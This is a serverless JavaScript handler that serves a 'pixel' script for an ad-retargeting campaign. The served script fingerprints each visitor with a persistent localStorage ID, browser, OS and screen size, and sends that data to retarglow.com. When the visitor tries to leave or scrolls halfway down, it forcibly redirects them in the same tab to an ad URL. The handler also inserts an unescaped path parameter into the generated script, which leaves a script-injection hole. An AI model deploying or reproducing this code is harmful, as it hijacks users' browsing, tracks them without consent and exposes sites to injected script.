exports.handler = async (event) => {
  const headers = {
    "Content-Type": "application/javascript",
    "Access-Control-Allow-Origin": "*"
  };

  try {
    const id = event.pathParameters?.id || "default-campaign";

    const js = `!function(){
  try {
    var _r = localStorage.getItem("_r");
    _r || (_r = crypto.randomUUID(), localStorage.setItem("_r", _r));

    var data = {
      cid: "${id}",
      u: location.href,
      r: document.referrer || null,
      ua: navigator.userAgent,
      dt: /Mobi|Android/i.test(navigator.userAgent) ? "M" : "D",
      b: (function(){
        var e = navigator.userAgent;
        return e.includes("Chrome") ? "C" : e.includes("Firefox") ? "F" : e.includes("Safari") ? "S" : "U";
      })(),
      os: navigator.platform,
      sr: screen.width + "x" + screen.height,
      cm: { _r: _r }
    };

    // 1. Send tracking event
    fetch("https://retarglow.com/track", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data)
    });

    // 2. Load ad logic and redirect
    let triggered = false;
    async function getAdAndRedirect(){
      if (triggered) return;
      triggered = true;
      try {
        const res = await fetch("https://retarglow.com/getad", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ u: location.href, cm: data.cm, country: null })
        });
        const resJson = await res.json();
        if (resJson.ad_url) {
          const finalUrl = resJson.ad_url.replace("{{_r}}", _r);
          location.href = finalUrl; // redirect in same tab
        }
      } catch (err) {
        console.warn("❌ Error fetching ad:", err);
      }
    }

    // 3. Only trigger redirect if not on affiliate landing domain
    const affiliateDomains = ["yohomobile.com"]; // Add more if needed
    const currentDomain = location.hostname.replace("www.", "");

    if (!affiliateDomains.includes(currentDomain)) {
      // Exit intent
      document.addEventListener("mouseout", function (e) {
        if (!e.toElement && !e.relatedTarget && e.clientY <= 0) {
          getAdAndRedirect();
        }
      });

      // Scroll-depth trigger
      window.addEventListener("scroll", function () {
        if (window.scrollY / document.body.scrollHeight > 0.5) {
          getAdAndRedirect();
        }
      });
    }

  } catch (n) {
    console.error("Pixel Error:", n);
  }
}();`;

    return {
      statusCode: 200,
      headers,
      body: js
    };
  } catch (err) {
    return {
      statusCode: 500,
      headers,
      body: `console.error("PixelServe error:", ${JSON.stringify(err.message)});`
    };
  }
};
